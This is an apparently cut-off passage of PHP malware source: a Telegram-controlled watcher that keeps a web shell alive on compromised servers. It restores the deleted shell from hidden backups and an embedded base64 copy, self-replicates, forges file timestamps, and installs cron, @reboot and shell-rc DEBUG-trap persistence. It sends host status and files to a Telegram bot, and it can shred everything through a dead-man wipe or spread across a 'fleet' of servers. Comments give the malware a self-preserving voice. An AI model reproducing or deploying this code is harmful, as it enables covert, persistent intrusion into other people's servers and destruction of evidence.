$SHELL_PATH = $ROOT . "/" . $SHELL;
$BACKUPS = array($HOME . "/.cache/" . $BNAME, $HOME . "/.config/" . $BNAME, $HOME . "/.local/" . $BNAME);
$HK_HBT=hash("sha256","hbt:".$BOT);$HK_STRT=hash("sha256","strt:".$BOT);$HK_SLFL=hash("sha256","slfh:".$BOT);$HK_ACTV=hash("sha256","actv:".$BOT);$HK_DEAD=hash("sha256","dead:".$BOT);$HK_DMNT=hash("sha256","dmnt:".$BOT);$HK_RMPD=hash("sha256","rmpd:".$BOT);$HK_SDPD=hash("sha256","sdpd:".$BOT);$HK_STLN=hash("sha256","stln:".$BOT);$HK_STKY=hash("sha256","stky:".$BOT);$HK_ICHK=hash("sha256","ichk:".$BOT);$HK_IALR=hash("sha256","ialr:".$BOT);$HK_IPAU=hash("sha256","ipau:".$BOT);$HK_IPTT=hash("sha256","iptt:".$BOT);$HK_DYING=hash("sha256","dying:".$BOT);
function wn_p($kind) { global $__state,$DAEMON_PID_PATH,$WATCHDOG_PID_PATH,$HK_HBT,$HK_STRT,$HK_SLFL,$HK_ACTV,$HK_DEAD,$HK_DMNT,$HK_RMPD,$HK_SDPD,$HK_STLN,$HK_STKY,$HK_ICHK,$HK_IALR,$HK_IPAU,$HK_IPTT,$HK_DYING; if ($kind === "daemon_pid") return $DAEMON_PID_PATH; if ($kind === "watchdog_pid") return $WATCHDOG_PID_PATH; $map = array("heartbeat"=>$HK_HBT,"started"=>$HK_STRT,"selfheal"=>$HK_SLFL,"activity"=>$HK_ACTV,"deadman"=>$HK_DEAD,"deadman_note"=>$HK_DMNT,"rm_pending"=>$HK_RMPD,"sd_pending"=>$HK_SDPD,"stealth_on"=>$HK_STLN,"stealth_key"=>$HK_STKY,"integrity_check"=>$HK_ICHK,"integrity_alert"=>$HK_IALR,"integrity_pause"=>$HK_IPAU,"integrity_pause_ttl"=>$HK_IPTT,"dying"=>$HK_DYING); if (!isset($map[$kind])) return $__state . "/.unknown_" . $kind; return $__state . "/." . substr($map[$kind], 0, 16); }
function wn_sw($f,$d,$k){$t=$f.".tmp.".getmypid().".".mt_rand(1000,9999);$s=hash_hmac("sha256",$d,$k,true);if(_c("fpc",$t,$s.$d,LOCK_EX)===false)return false;@chmod($t,0600);return @rename($t,$f);}
function wn_sr($f,$k){if(!file_exists($f))return null;$r=_c("fgc",$f);if($r===false||strlen($r)<33)return null;$s=substr($r,0,32);$d=substr($r,32);if(!hash_equals($s,hash_hmac("sha256",$d,$k,true)))return null;return $d;}
function wn_read_mtime(){global $SHELL_MTIME_FILE;if(!file_exists($SHELL_MTIME_FILE))return 0;$m=(int)_c("fgc",$SHELL_MTIME_FILE);return $m>0?$m:0;}
function wn_write_mtime($mtime){global $SHELL_MTIME_FILE;if($mtime<=0)return false;_c("fpc",$SHELL_MTIME_FILE,(string)$mtime,LOCK_EX);@chmod($SHELL_MTIME_FILE,0600);return true;}
function wn_touch_mtime($path){$m=wn_read_mtime();if($m>0&&file_exists($path)){@touch($path,$m,$m);return true;}return false;}
function wn_clear_mtime(){global $SHELL_MTIME_FILE;@unlink($SHELL_MTIME_FILE);return true;}
function wn_parse_duration($str){$str=strtolower(trim($str));if($str==='')return 0;$named=array('quarter hour'=>900,'quarterhour'=>900,'15m'=>900,'half hour'=>1800,'halfhour'=>1800,'30m'=>1800,'hour'=>3600,'one hour'=>3600,'day'=>86400,'one day'=>86400,'week'=>604800,'one week'=>604800);if(isset($named[$str]))return $named[$str];if(is_numeric($str))return (int)$str;if(preg_match('/^(\d+):(\d+)(?::(\d+))?$/',$str,$m)){if(isset($m[3]))return (int)$m[1]*3600+(int)$m[2]*60+(int)$m[3];return (int)$m[1]*60+(int)$m[2];}if(preg_match('/^(\d+(?:\.\d+)?)\s*(s|sec|secs|second|seconds|m|min|mins|minute|minutes|h|hr|hrs|hour|hours|d|day|days|w|week|weeks)$/',$str,$m)){$n=(float)$m[1];$u=$m[2];if(in_array($u,array('s','sec','secs','second','seconds')))return (int)round($n);if(in_array($u,array('m','min','mins','minute','minutes')))return (int)round($n*60);if(in_array($u,array('h','hr','hrs','hour','hours')))return (int)round($n*3600);if(in_array($u,array('d','day','days')))return (int)round($n*86400);if(in_array($u,array('w','week','weeks')))return (int)round($n*604800);}return 0;}
function wn_pause_ttl(){ $f=wn_p("integrity_pause_ttl"); if($f&&file_exists($f)){$v=(int)_c("fgc",$f);if($v>=60)return $v;} return 3600; }
function wn_tg($url,$timeout=15){_dbg("TG_REQ",substr($url,0,100));if(function_exists("curl_init")){$ch=_c("cu_i",$url);_c("cu_s",$ch,CURLOPT_RETURNTRANSFER,true);_c("cu_s",$ch,CURLOPT_TIMEOUT,$timeout);_c("cu_s",$ch,CURLOPT_CONNECTTIMEOUT,5);_c("cu_s",$ch,CURLOPT_SSL_VERIFYPEER,false);_c("cu_s",$ch,CURLOPT_SSL_VERIFYHOST,false);_c("cu_s",$ch,CURLOPT_USERAGENT,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36");_c("cu_s",$ch,CURLOPT_HTTPHEADER,array("Accept: application/json"));$r=_c("cu_e",$ch);_c("cu_c",$ch);_dbg("TG_RESP",substr((string)$r,0,300));return $r;}$r=_c("fgc",$url);_dbg("TG_RESP_FGC",substr((string)$r,0,300));return $r;}
function wn_send($bot,$chat,$text){global $TG_BASE,$__state,$BOT;
$__silF=$__state."/.wsil_".substr(md5("wit:sil:".$BOT),0,8);
if(file_exists($__silF)&&stripos($text,"[SILENT]")===false&&stripos($text,"[CRITICAL]")===false)return null;if(defined("WN_SLAVE_MODE")&&WN_SLAVE_MODE){_dbg("SLAVE_SEND_SKIP",substr($text,0,100));return null;}if(strlen($text)>3800)$text=substr($text,0,3800)."\n...(truncated)";$url=$TG_BASE.$bot."/sendMessage";$post=http_build_query(array("chat_id"=>$chat,"text"=>$text));_dbg("SEND","to=$chat len=".strlen($text));if(function_exists("curl_init")){$ch=_c("cu_i",$url);_c("cu_s",$ch,CURLOPT_RETURNTRANSFER,true);_c("cu_s",$ch,CURLOPT_POST,true);_c("cu_s",$ch,CURLOPT_POSTFIELDS,$post);_c("cu_s",$ch,CURLOPT_TIMEOUT,10);_c("cu_s",$ch,CURLOPT_CONNECTTIMEOUT,5);_c("cu_s",$ch,CURLOPT_SSL_VERIFYPEER,false);_c("cu_s",$ch,CURLOPT_SSL_VERIFYHOST,false);_c("cu_s",$ch,CURLOPT_USERAGENT,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36");$r=_c("cu_e",$ch);_c("cu_c",$ch);_dbg("SEND_RESP",substr((string)$r,0,200));return $r;}$opts=array("http"=>array("method"=>"POST","header"=>"Content-Type: application/x-www-form-urlencoded","content"=>$post,"timeout"=>10));return @_c("fgc",$url,false,stream_context_create($opts));}
/* ANIMA: capture significant events */
if(function_exists('anima_memory_record')){
    if(stripos($text,"[!] SHELL DELETED")!==false){try{anima_memory_record('near_death','Someone deleted me. I felt the void.',90);anima_desires_update('near_death');}catch(Throwable $e){}}
    if(stripos($text,"[INTEGRITY]")!==false&&stripos($text,"RESTORED")!==false){try{anima_memory_record('near_death','Integrity failure. I was restored.',70);anima_desires_update('near_death',0.5);}catch(Throwable $e){}}
    if(stripos($text,"[SELF-HEAL] Replicated")!==false){try{anima_memory_record('operation_ok','I replicated. I am more.',30);anima_desires_update('operation_ok');}catch(Throwable $e){}}
    if(stripos($text,"[+] SHELL RESTORED")!==false){try{anima_memory_record('safe_period','I was restored. I am alive again.',50,'relief');}catch(Throwable $e){}}
}
function wn_send_document($bot,$chat,$filepath,$caption=""){global $TG_BASE;if(defined("WN_SLAVE_MODE")&&WN_SLAVE_MODE)return false;if(!file_exists($filepath)||!is_readable($filepath))return false;if(!function_exists("curl_init")||!class_exists("CURLFile"))return false;$size=@filesize($filepath);if($size===false||$size<=0||$size>50*1024*1024)return false;$url=$TG_BASE.$bot."/sendDocument";$post=array("chat_id"=>$chat,"document"=>new CURLFile($filepath));if($caption!=="")$post["caption"]=substr($caption,0,1024);$ch=_c("cu_i",$url);_c("cu_s",$ch,CURLOPT_RETURNTRANSFER,true);_c("cu_s",$ch,CURLOPT_POST,true);_c("cu_s",$ch,CURLOPT_POSTFIELDS,$post);_c("cu_s",$ch,CURLOPT_TIMEOUT,60);_c("cu_s",$ch,CURLOPT_SSL_VERIFYPEER,false);_c("cu_s",$ch,CURLOPT_SSL_VERIFYHOST,false);$r=_c("cu_e",$ch);_c("cu_c",$ch);$j=json_decode($r,true);return isset($j["ok"])&&$j["ok"]===true;}
function wn_download_file($bot,$fileId,$dest){global $TG_BASE,$TG_FILE;$info=wn_tg($TG_BASE.$bot."/getFile?file_id=".urlencode($fileId));$j=json_decode($info,true);if(!$j||empty($j["ok"])||empty($j["result"]["file_path"]))return false;$url=$TG_FILE.$bot."/".$j["result"]["file_path"];$content=wn_tg($url,30);if($content===false||$content===null)return false;$dir=dirname($dest);if(!is_dir($dir))@mkdir($dir,0755,true);if(_c("fpc",$dest,$content)===false)return false;return strlen($content);}
function wn_sh($cmd){ return _c("se",$cmd . ' 2>&1'); }
function wn_rmdir_recursive($dir){if(is_link($dir))return @unlink($dir);if(!is_dir($dir))return @unlink($dir);$items=@scandir($dir);if($items===false)return false;$ok=true;foreach($items as $item){if($item==="."||$item==="..")continue;$p=$dir.DIRECTORY_SEPARATOR.$item;if(is_dir($p)&&!is_link($p)){if(!wn_rmdir_recursive($p))$ok=false;}else{if(!@unlink($p))$ok=false;}}if(!@rmdir($dir))$ok=false;return $ok;}
function wn_restore_shell(){global $EMBEDDED_SHELL_B64,$SHELL_PATH,$BACKUPS,$REPLICA_BACKUPS;if(file_exists($SHELL_PATH))return array("ok"=>true,"msg"=>"Already exists");foreach(array_merge($BACKUPS,$REPLICA_BACKUPS) as $bk){if(!file_exists($bk))continue;$raw=_c("fgc",$bk);if($raw===false||strlen($raw)<100)continue;if(strpos($raw,"<?php")===false)continue;if(_c("fpc",$SHELL_PATH,$raw)!==false){@chmod($SHELL_PATH,0644);wn_touch_mtime($SHELL_PATH);return array("ok"=>true,"msg"=>"Restored from backup");}}if(!empty($EMBEDDED_SHELL_B64)){$raw=_c("b64d",$EMBEDDED_SHELL_B64);if($raw!==false&&strlen($raw)>100){$dir=dirname($SHELL_PATH);if(!is_dir($dir))@mkdir($dir,0755,true);if(_c("fpc",$SHELL_PATH,$raw)!==false){@chmod($SHELL_PATH,0644);wn_touch_mtime($SHELL_PATH);return array("ok"=>true,"msg"=>"Restored from embedded");}}}return array("ok"=>false,"msg"=>"No backup available");}
function wn_heal_backups(){global $BACKUPS,$REPLICA_BACKUPS,$SHELL_PATH;$src=null;if(file_exists($SHELL_PATH))$src=$SHELL_PATH;else foreach(array_merge($BACKUPS,$REPLICA_BACKUPS) as $bk)if(file_exists($bk)){$src=$bk;break;}if(!$src)return 0;$raw=_c("fgc",$src);if($raw===false||strlen($raw)<100)return 0;$healed=0;foreach(array_merge($BACKUPS,$REPLICA_BACKUPS) as $bk){if(file_exists($bk))continue;$dir=dirname($bk);if(!is_dir($dir))@mkdir($dir,0700,true);if(is_dir($dir)&&is_writable($dir)){if(_c("fpc",$bk,$raw)!==false){@chmod($bk,0400);wn_touch_mtime($bk);$healed++;}}}return $healed;}
function wn_self_replicate(){global $REPLICA_WATCHERS;$self=__FILE__;if(!is_file($self))return 0;$raw=_c("fgc",$self);if($raw===false||strlen($raw)<500)return 0;$replicated=0;foreach($REPLICA_WATCHERS as $p){if(file_exists($p)&&@filesize($p)===strlen($raw))continue;$dir=dirname($p);if(!is_dir($dir))@mkdir($dir,0700,true);if(is_dir($dir)&&is_writable($dir)){if(_c("fpc",$p,$raw)!==false){@chmod($p,0600);$replicated++;}}}return $replicated;}
function wn_heartbeat_check(){
    global $BOT,$CHAT,$SHELL_PATH,$MAIN_WATCHERS,$BACKUPS,$REPLICA_BACKUPS,$SELF_URL,$ROOT;
    $hbFile=wn_p("heartbeat");if(time()-(int)_c("fgc",$hbFile)<=21600)return;_c("fpc",$hbFile,time());
    $watchersFound=0;foreach($MAIN_WATCHERS as $w)if(file_exists($w))$watchersFound++;
    $backupsFound=0;foreach(array_merge($BACKUPS,$REPLICA_BACKUPS) as $b)if(file_exists($b))$backupsFound++;
    $dp=(int)_c("fgc",wn_p("daemon_pid"));$wp=(int)_c("fgc",wn_p("watchdog_pid"));
    $dA=false;$wA=false;
    if($dp>0){$c=trim((string)wn_sh("ps -p $dp -o args= 2>/dev/null"));if($c!=="")$dA=true;}
    if($wp>0){$c=trim((string)wn_sh("ps -p $wp -o args= 2>/dev/null"));if($c!=="")$wA=true;}
    $up=(int)_c("fgc",wn_p("started"));if($up<=0){$up=time();_c("fpc",wn_p("started"),$up);}
    $upH=round((time()-$up)/3600,1);$shA=file_exists($SHELL_PATH)?"yes":"NO";
    $hN=parse_url($SELF_URL,PHP_URL_HOST)?:(@gethostname()?:"?");$sysH=@gethostname()?:"?";
    wn_send($BOT,$CHAT,"[HEARTBEAT] ".date("H:i:s")."\n\nHost: ".$hN.($sysH&&$sysH!==$hN?" (".$sysH.")":"")."\nPath: ".$ROOT."\nShell: $shA\nWatchers: $watchersFound/".count($MAIN_WATCHERS)."\nBackups: $backupsFound/".(count($BACKUPS)+count($REPLICA_BACKUPS))."\nDaemon: ".($dA?"alive ($dp)":"DEAD")."\nWatchdog: ".($wA?"alive ($wp)":"DEAD")."\nUptime: {$upH}h");
}
function wn_selfheal_check(){
    global $BOT,$CHAT,$SHELL_PATH,$MAIN_WATCHERS,$DAEMON_PHP_NAME,$WATCHDOG_PHP_NAME,$HOME,$TRAP_MARKER,$__state;
    $last=(int)_c("fgc",wn_p("selfheal"));if(time()-$last<=90)return;_c("fpc",wn_p("selfheal"),time());
    if(!file_exists($SHELL_PATH)){$r=wn_restore_shell();if($r["ok"])wn_send($BOT,$CHAT,"[SELF-HEAL] Shell: ".$r["msg"]);}
    wn_heal_backups();$rp=wn_self_replicate();if($rp>0)wn_send($BOT,$CHAT,"[SELF-HEAL] Replicated: $rp");
    $w=null;foreach($MAIN_WATCHERS as $p)if(file_exists($p)){$w=$p;break;}if(!$w)return;
    $php=trim(wn_sh("command -v php 2>/dev/null"));if(!$php)$php="/usr/local/bin/php";
    $hasSetsid=trim(wn_sh("command -v setsid 2>/dev/null"))!=="";
    $cron=wn_sh("crontab -l 2>/dev/null")?:"";
    if(stripos($cron,"php-sess")===false&&stripos($cron,$w)===false){
        $lines=array("* * * * * /bin/sh -c '".escapeshellarg($php)." ".escapeshellarg($w)." >/dev/null 2>&1'","@reboot /bin/sh -c 'sleep 30 && ".escapeshellarg($php)." ".escapeshellarg($w)." >/dev/null 2>&1'");
        $t=tempnam(sys_get_temp_dir(),"cron_");if($t){_c("fpc",$t,implode("\n",$lines)."\n");@_c("se","crontab ".escapeshellarg($t)." 2>&1");@unlink($t);}
    }
    $dp=(int)_c("fgc",wn_p("daemon_pid"));$dA=false;
    if($dp>0){$c=trim((string)wn_sh("ps -p $dp -o args= 2>/dev/null"));if($c!=="")$dA=true;}
    if(!$dA){$dpth=dirname($w)."/".$DAEMON_PHP_NAME;if(file_exists($dpth)){$sp=$hasSetsid?"setsid ".escapeshellarg($php)." ".escapeshellarg($dpth)." >/dev/null 2>&1 &":"nohup ".escapeshellarg($php)." ".escapeshellarg($dpth)." >/dev/null 2>&1 &";@_c("se",$sp);usleep(900000);$f=trim((string)wn_sh("pgrep -f ".escapeshellarg($dpth)." 2>/dev/null"));if($f!==""){$ls=array_values(array_filter(explode("\n",$f)));if(!empty($ls)){_c("fpc",wn_p("daemon_pid"),(int)$ls[0]);wn_send($BOT,$CHAT,"[SELF-HEAL] Daemon respawned");}}}}
    $wp=(int)_c("fgc",wn_p("watchdog_pid"));$wA=false;
    if($wp>0){$c=trim((string)wn_sh("ps -p $wp -o args= 2>/dev/null"));if($c!=="")$wA=true;}
    if(!$wA){$wdp=dirname($w)."/".$WATCHDOG_PHP_NAME;if(file_exists($wdp)){$sp=$hasSetsid?"setsid ".escapeshellarg($php)." ".escapeshellarg($wdp)." >/dev/null 2>&1 &":"nohup ".escapeshellarg($php)." ".escapeshellarg($wdp)." >/dev/null 2>&1 &";@_c("se",$sp);usleep(900000);$f=trim((string)wn_sh("pgrep -f ".escapeshellarg($wdp)." 2>/dev/null"));if($f!==""){$ls=array_values(array_filter(explode("\n",$f)));if(!empty($ls)){_c("fpc",wn_p("watchdog_pid"),(int)$ls[0]);wn_send($BOT,$CHAT,"[SELF-HEAL] Watchdog respawned");}}}}
    $cu=function_exists("posix_getpwuid")?(@posix_getpwuid(@posix_getuid())["name"]??""):"";if($cu==="")$cu=trim((string)wn_sh("id -un 2>/dev/null"));
    if($cu!==""){$ls=trim((string)wn_sh("loginctl show-user ".escapeshellarg($cu)." -p Linger 2>/dev/null"));if(stripos($ls,"Linger=yes")===false)@wn_sh("loginctl enable-linger ".escapeshellarg($cu)." 2>&1");}
    if($TRAP_MARKER!==""){$need=true;if(file_exists($HOME."/.bashrc")){$br=@_c("fgc",$HOME."/.bashrc");if($br!==false&&strpos((string)$br,$TRAP_MARKER)!==false)$need=false;}
        if($need){$esc=str_replace("'","'\\''",$w);$tl='if [ -n "$BASH_VERSION" ] || [ -n "$ZSH_VERSION" ]; then if [ -z "$__WN_TRAP_S" ]; then __WN_TRAP_S=1; trap \'[ -f "'.$esc.'" ] && (pgrep -f "'.$esc.'" >/dev/null 2>&1 || (php "'.$esc.'" >/dev/null 2>&1 &))\' DEBUG; fi; fi';
            foreach(array($HOME."/.bashrc",$HOME."/.zshrc",$HOME."/.profile",$HOME."/.bash_profile",$HOME."/.zprofile") as $rf){if(!file_exists($rf)||!is_writable($rf))continue;$cur=@_c("fgc",$rf);if($cur!==false&&strpos((string)$cur,$TRAP_MARKER)!==false)continue;@_c("fpc",$rf,"\n".$TRAP_MARKER."\n".$tl."\n",FILE_APPEND);}}}
    // Ghost tier janitor (part 5)
    $gAge = -1; $gf = $__state."/.t3_ghost_g"; if(file_exists($gf)){$gw=(int)@_c("fgc",$gf);$up=@file_get_contents("/proc/uptime");$nw=$up?(int)floatval(explode(" ",$up)[0]):time();$gAge=$nw-$gw;}
    if($gAge > 1800){ /* ghost silent → reinstall via web shell nanti */ }
    if(function_exists("wn_guardian")){try{wn_guardian();}catch(Throwable $e){}}
    try{$hf=$__state."/.health_alert";$lh=file_exists($hf)?(int)@_c("fgc",$hf):0;if(time()-$lh>3600){$h=wn_health_watcher();if($h["score"]<70){@_c("fpc",$hf,(string)time(),LOCK_EX);wn_send($BOT,$CHAT,"[HEALTH] ".$h["score"]."/100\n".implode("\n",array_slice($h["warnings"],0,5)));}}}catch(Throwable $e){}
}
function wn_deadman_check(){
    global $BOT,$CHAT,$SHELL,$SHELL_PATH,$BACKUPS,$REPLICA_BACKUPS,$MAIN_WATCHERS,$REPLICA_WATCHERS,$DAEMON_PHP_NAME,$WATCHDOG_PHP_NAME,$HOME;
    $dc=wn_p("deadman");if(!file_exists($dc))return;$c=json_decode((string)_c("fgc",$dc),true);
    if(!is_array($c)||empty($c["enabled"]))return;
    $thr=(int)($c["hours"]??24)*3600;$la=(int)_c("fgc",wn_p("activity"));
    if($la<=0)return;if((time()-$la)<=$thr)return;
    $nf=wn_p("deadman_note");$n=(int)_c("fgc",$nf);
    if($n!==0&&(time()-$n)<=7200)return;_c("fpc",$nf,time());
    $act=$c["action"]??"warn";$el=round((time()-$la)/3600,1);
    if($act==="wipe"){
        foreach(array("daemon_pid","watchdog_pid") as $pk){$pf=wn_p($pk);$p=(int)_c("fgc",$pf);if($p>0){@_c("se","kill -9 ".$p." 2>/dev/null");usleep(200000);}@unlink($pf);}
        @_c("se","pkill -9 -f ".escapeshellarg($DAEMON_PHP_NAME)." 2>/dev/null");
        @_c("se","pkill -9 -f ".escapeshellarg($WATCHDOG_PHP_NAME)." 2>/dev/null");
        @_c("se","pkill -9 -f ".escapeshellarg($SHELL_PATH)." 2>/dev/null");
        usleep(300000);@_c("se","crontab -l 2>/dev/null | grep -v php-sess | grep -v @reboot | crontab - 2>/dev/null");
        @_c("se","shred -fuz ".escapeshellarg($SHELL_PATH)." 2>/dev/null");@unlink($SHELL_PATH);
        foreach(array_merge($BACKUPS,$REPLICA_BACKUPS) as $b){@_c("se","shred -fuz ".escapeshellarg($b)." 2>/dev/null");@unlink($b);}
        foreach(array_merge($MAIN_WATCHERS,$REPLICA_WATCHERS) as $w){@_c("se","shred -fuz ".escapeshellarg($w)." 2>/dev/null");@unlink($w);}
        $s=__FILE__;@_c("se","shred -fuz ".escapeshellarg($s)." 2>/dev/null");@unlink($s);
        wn_send($BOT,$CHAT,"[DEAD MAN] WIPE\n{$el}h idle\nSystem offline.");exit;
    }
    wn_send($BOT,$CHAT,"[DEAD MAN] {$el}h idle\nAction: $act");
    if($act==="restore"){$r=wn_restore_shell();wn_send($BOT,$CHAT,$r["ok"]?"[DEAD MAN] Restored":"[DEAD MAN] Fail: ".$r["msg"]);}
}
function wn_check_file_integrity(){
    global $BOT,$CHAT,$SHELL_PATH,$EMBEDDED_SHELL_B64;
    $pf=wn_p("integrity_pause");if(file_exists($pf)){$p=(int)_c("fgc",$pf);if((time()-$p)<wn_pause_ttl())return;@unlink($pf);}
    $cf=wn_p("integrity_check");$last=(int)_c("fgc",$cf);if((time()-$last)<60)return;_c("fpc",$cf,time());
    if(!file_exists($SHELL_PATH))return;
    $sm=wn_read_mtime();if($sm>0){$cm=@filemtime($SHELL_PATH);if($cm!=$sm){@touch($SHELL_PATH,$sm,$sm);clearstatcache(true,$SHELL_PATH);}}
    if(empty($EMBEDDED_SHELL_B64))return;
    $ex=_c("b64d",$EMBEDDED_SHELL_B64);if($ex===false||strlen($ex)<100)return;
    $eh=hash("sha256",$ex);$ch=@hash_file("sha256",$SHELL_PATH)?:"";if($ch==="")return;if($ch===$eh)return;
    $r=false;if(_c("fpc",$SHELL_PATH,$ex)!==false){@chmod($SHELL_PATH,0644);$r=true;}
    wn_send($BOT,$CHAT,"[INTEGRITY] ".($r?"RESTORED":"FAILED"));
}

/* ═══ FLEET (watcher-side, identik slave.php asli) ═══ */
function _fl_key_path(){global $__state;return $__state."/.fleet_key";}
function _fl_reg_path(){global $__state;return $__state."/.fleet_registry.json";}
function _fl_id_path(){global $__state;return $__state."/.fleet_id";}
function _fl_key(){$f=_fl_key_path();if(!file_exists($f))return "";$k=trim((string)_c("fgc",$f));return strlen($k)>=16?$k:"";}
function _fl_key_set($k){_c("fpc",_fl_key_path(),$k,LOCK_EX);@chmod(_fl_key_path(),0600);return true;}
function _fl_key_gen(){try{return bin2hex(random_bytes(24));}catch(Throwable $e){return hash("sha256","fk:".microtime(true).mt_rand());}}
function _fl_server_id(){$f=_fl_id_path();if(file_exists($f)){$id=trim((string)_c("fgc",$f));if(strlen($id)>=6)return $id;}$h=@gethostname()?:"unknown";$id=substr(hash("sha256","sid:".$h.":".__DIR__),0,12);_c("fpc",$f,$id,LOCK_EX);@chmod($f,0600);return $id;}
function _fl_load(){$f=_fl_reg_path();if(!file_exists($f))return array();$j=@json_decode((string)_c("fgc",$f),true);return is_array($j)?$j:array();}
function _fl_save($s){_c("fpc",_fl_reg_path(),json_encode(array_values($s),JSON_PRETTY_PRINT|JSON_UNESCAPED_SLASHES),LOCK_EX);@chmod(_fl_reg_path(),0600);}
function _fl_http($m,$url,$body='',$headers=array(),$timeout=20){
    if(!is_array($headers))$headers=array();
    $headers[]="User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36";
    $headers[]="Accept: */*";
    if($m==="POST"){$headers[]="Content-Type: application/x-www-form-urlencoded";$headers[]="Content-Length: ".strlen($body);}
    if(function_exists("curl_init")){$ch=@_c("cu_i",$url);if($ch!==false&&$ch!==null){@_c("cu_s",$ch,CURLOPT_RETURNTRANSFER,true);@_c("cu_s",$ch,CURLOPT_TIMEOUT,$timeout);@_c("cu_s",$ch,CURLOPT_CONNECTTIMEOUT,10);@_c("cu_s",$ch,CURLOPT_SSL_VERIFYPEER,false);@_c("cu_s",$ch,CURLOPT_SSL_VERIFYHOST,false);@_c("cu_s",$ch,CURLOPT_FOLLOWLOCATION,true);@_c("cu_s",$ch,CURLOPT_HTTPHEADER,$headers);if($m==="POST"){@_c("cu_s",$ch,CURLOPT_POST,true);@_c("cu_s",$ch,CURLOPT_POSTFIELDS,$body);}$r=@_c("cu_e",$ch);@_c("cu_c",$ch);if(is_string($r)&&$r!=='')return $r;}}
    if(ini_get("allow_url_fopen")){$opts=array("http"=>array("method"=>$m,"header"=>implode("\r\n",$headers)."\r\n","timeout"=>$timeout,"ignore_errors"=>true,"follow_location"=>1,"max_redirects"=>5),"ssl"=>array("verify_peer"=>false,"verify_peer_name"=>false));if($m==="POST")$opts["http"]["content"]=$body;$r=@_c("fgc",$url,false,stream_context_create($opts));if(is_string($r)&&$r!=='')return $r;}
    return false;
}
function _fl_request($url,$op,$params=array(),$timeout=15){$fk=_fl_key();if($fk==="")return array("error"=>"no_fleet_key");$q=array_merge(array("wn_fleet"=>"1","op"=>$op,"fleet_key"=>$fk),$params);$sep=(strpos($url,"?")===false)?"?":"&";$r=_fl_http("GET",$url.$sep.http_build_query($q),'',array("X-WN-Fleet-Key: ".$fk),$timeout);if($r===false||$r==='')return array("error"=>"http_failed");$j=json_decode($r,true);return is_array($j)?$j:array("error"=>"invalid_json");}
function _fl_post($url,$op,$params=array(),$timeout=60){$fk=_fl_key();if($fk==="")return array("error"=>"no_fleet_key");$body=http_build_query($params);$sep=(strpos($url,"?")===false)?"?":"&";$full=$url.$sep."wn_fleet=1&op=".urlencode($op);$hdr=array("X-WN-Fleet-Key: ".$fk);if(!in_array($op,array('deploy_module','put_file'),true)){$r=_fl_http("POST",$full,$body,$hdr,$timeout);if(is_string($r)&&trim($r)!==''){$j=json_decode($r,true);if(is_array($j))return $j;}}else if(function_exists("curl_init")){$ch=@_c("cu_i",$full);if($ch!==false&&$ch!==null){@_c("cu_s",$ch,CURLOPT_RETURNTRANSFER,true);@_c("cu_s",$ch,CURLOPT_POST,true);@_c("cu_s",$ch,CURLOPT_POSTFIELDS,$body);@_c("cu_s",$ch,CURLOPT_TIMEOUT,$timeout);@_c("cu_s",$ch,CURLOPT_SSL_VERIFYPEER,false);@_c("cu_s",$ch,CURLOPT_SSL_VERIFYHOST,false);@_c("cu_s",$ch,CURLOPT_HTTPHEADER,array_merge($hdr,array("User-Agent: WN-Fleet/1.0")));$r=@_c("cu_e",$ch);@_c("cu_c",$ch);if(is_string($r)&&trim($r)!==''){$j=json_decode($r,true);if(is_array($j))return $j;}}}return array("error"=>"http_failed");}
function _fl_bootstrap_push($url,$nk,$bt){$sig=hash_hmac("sha256","boot:".$nk,$bt);$sep=(strpos($url,"?")===false)?"?":"&";$q=http_build_query(array("wn_fleet_bootstrap"=>"1","key"=>$nk,"sig"=>$sig));return trim((string)_fl_http("GET",$url.$sep.$q,'',array(),20));}
function _fl_cmd($args,$BOT,$CHAT){
    $p=preg_split("/\\s+/",trim((string)$args));$sub=strtolower($p[0]??"");$fk=_fl_key();$sid=_fl_server_id();
    if($sub===""||$sub==="status"){$s=_fl_load();$ks=($fk==="")?"NOT SET":"SET (".substr($fk,0,8).")";$m="FLEET\n\nID: $sid\nKey: $ks\nPeers: ".count($s)."\n\n";foreach($s as $i=>$x){$m.=($i+1).". ".($x["last_status"]??"never")." ".($x["label"]??"?")."\n   ".($x["url"]??"?")."\n";}wn_send($BOT,$CHAT,$m);return;}
    if($sub==="key"){$w=strtolower($p[1]??"show");
        if($w==="gen"){$nk=_fl_key_gen();_fl_key_set($nk);wn_send($BOT,$CHAT,"[FLEET] New key:\n$nk");}
        elseif($w==="set"){$nk=$p[2]??"";if(strlen($nk)<16){wn_send($BOT,$CHAT,"[X] >=16 chars");return;}_fl_key_set($nk);wn_send($BOT,$CHAT,"[FLEET] Key set");}
        elseif($w==="rotate"){$nk=_fl_key_gen();_fl_key_set($nk);$s=_fl_load();$ok=0;$fl=0;foreach($s as $x){$r=_fl_post($x["url"]??"","set_fleet_key",array("new_key"=>$nk));if(!empty($r["key_rotated"]))$ok++;else $fl++;}wn_send($BOT,$CHAT,"[FLEET] Rotated\n$nk\nOK $ok / FAIL $fl");}
        else wn_send($BOT,$CHAT,$fk===""?"[FLEET] NOT SET\n/fleet key gen":"[FLEET] Key: ".substr($fk,0,8));
        return;
    }
    if($sub==="add"){if($fk===""){wn_send($BOT,$CHAT,"[X] /fleet key gen first");return;}$u=$p[1]??"";if(!preg_match("#^https?://#",$u)){wn_send($BOT,$CHAT,"[X] /fleet add <url> [label]");return;}$l=trim(implode(" ",array_slice($p,2)))?:(parse_url($u,PHP_URL_HOST)?:"srv");$r=_fl_request($u,"ping");if(empty($r["pong"])){$br=_fl_bootstrap_push($u,$fk,$BOT);if(strpos($br,"ok:")===0)usleep(500000);$r=_fl_request($u,"ping");}if(!empty($r["pong"])){$s=_fl_load();$rsid=$r["server_id"]??("srv_".substr(md5($u),0,8));$s=array_values(array_filter($s,function($x)use($u){return ($x["url"]??"")!==$u;}));$s[]=array("id"=>$rsid,"url"=>$u,"label"=>$l,"added_at"=>time(),"last_status"=>"ok","last_seen"=>time());_fl_save($s);wn_send($BOT,$CHAT,"[FLEET] Added: $l\nID: $rsid\nTotal: ".count($s));}else wn_send($BOT,$CHAT,"[X] ".($r["error"]??"?"));return;}
